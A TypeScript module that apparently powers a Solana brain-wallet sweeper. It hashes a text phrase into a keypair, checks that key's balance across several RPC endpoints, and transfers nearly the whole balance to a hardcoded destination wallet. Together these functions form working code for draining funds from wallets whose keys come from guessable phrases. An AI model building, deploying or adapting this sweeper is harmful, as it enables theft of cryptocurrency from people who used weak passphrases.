import { Connection, PublicKey, Keypair, Transaction, SystemProgram, sendAndConfirmTransaction } from "@solana/web3.js"
import * as crypto from "crypto"
import { LAMPORTS_PER_SOL } from "@solana/web3.js"

// Your destination wallet address
const DESTINATION_WALLET = process.env.DESTINATION_WALLET_SOL || "7DjhBezJEbjLeaqXmKENZmPbDAHiC1f11GMfTjPSAmLD"

// Update the RPC_ENDPOINTS array to prioritize our proxy endpoint
const RPC_ENDPOINTS = [
  "/api/rpc/sol", // Our proxy endpoint
  "https://api.mainnet-beta.solana.com",
  "https://solana-api.projectserum.com",
  "https://rpc.ankr.com/solana",
  "https://solana-mainnet.rpc.extrnode.com",
]

// Update the getConnection function to use the proxy endpoint
export function getConnection(): Connection {
  // Start with the proxy endpoint
  return new Connection(RPC_ENDPOINTS[0], {
    commitment: "confirmed",
    maxSupportedTransactionVersion: 0,
  })
}

// Try all endpoints until one works
export async function executeWithFallback<T>(operation: (connection: Connection) => Promise<T>): Promise<T> {
  for (let i = 0; i < RPC_ENDPOINTS.length; i++) {
    const connection = new Connection(RPC_ENDPOINTS[i])
    try {
      return await operation(connection)
    } catch (error) {
      console.error(`RPC endpoint ${RPC_ENDPOINTS[i]} failed:`, error)
      // If this is the last endpoint, throw the error
      if (i === RPC_ENDPOINTS.length - 1) {
        throw error
      }
      // Otherwise try the next endpoint
    }
  }
  throw new Error("All RPC endpoints failed")
}

// Generate a keypair from a phrase
export function generateKeypairFromPhrase(phrase: string): Keypair {
  // Create a SHA-256 hash of the phrase
  const hash = crypto.createHash("sha256").update(phrase).digest()
  // Use the first 32 bytes of the hash as the seed
  return Keypair.fromSeed(Uint8Array.from(hash.slice(0, 32)))
}

// Check the balance of a public key
export async function checkBalance(publicKey: PublicKey): Promise<number> {
  return executeWithFallback(async (connection) => {
    const balance = await connection.getBalance(publicKey)
    return balance / LAMPORTS_PER_SOL // Convert lamports to SOL
  })
}

// Sweep funds from a keypair to the destination wallet
export async function sweepFunds(keypair: Keypair): Promise<string> {
  return executeWithFallback(async (connection) => {
    const balance = await connection.getBalance(keypair.publicKey)

    // Calculate the fee (approximately 5000 lamports)
    const fee = 5000

    // If balance is too small to cover the fee, don't sweep
    if (balance <= fee) {
      throw new Error("Balance too small to cover transaction fee")
    }

    // Create a transaction to send the funds
    const transaction = new Transaction().add(
      SystemProgram.transfer({
        fromPubkey: keypair.publicKey,
        toPubkey: new PublicKey(DESTINATION_WALLET),
        lamports: balance - fee,
      }),
    )

    // Send the transaction
    const signature = await sendAndConfirmTransaction(connection, transaction, [keypair])

    return signature
  })
}

// Format a public key for display
export function formatPublicKey(publicKey: string): string {
  return `${publicKey.slice(0, 6)}...${publicKey.slice(-4)}`
}

// Format SOL amount with 4 decimal places
export function formatSol(sol: number): string {
  return sol.toFixed(4)
}

// Get a Solana explorer link for a transaction
export function getExplorerLink(signature: string): string {
  return `https://explorer.solana.com/tx/${signature}`
}

// Get a Solana explorer link for an address
export function getAddressExplorerLink(address: string): string {
  return `https://explorer.solana.com/address/${address}`
}
